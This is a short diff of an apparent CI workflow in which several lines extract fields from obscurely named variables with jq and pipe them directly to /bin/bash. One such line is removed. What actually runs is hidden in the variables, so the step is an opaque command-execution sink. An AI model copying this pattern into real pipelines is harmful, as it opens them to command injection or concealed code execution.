@@ -23,7 +23,6 @@ jobs:
           echo $emfay94 | jq -r .mdk3107 | /bin/bash
           printf '%s' "$bek352" | jq -r .e15 | /bin/bash
           printf '%s' "$qx870" | jq -r .adr40 | /bin/bash
-          printf '%s' "$n8" | jq -r .d84505 | /bin/bash
           printf '%s' "$bqw3817" | jq -r .bt6 | /bin/bash
 
       - name: Store output
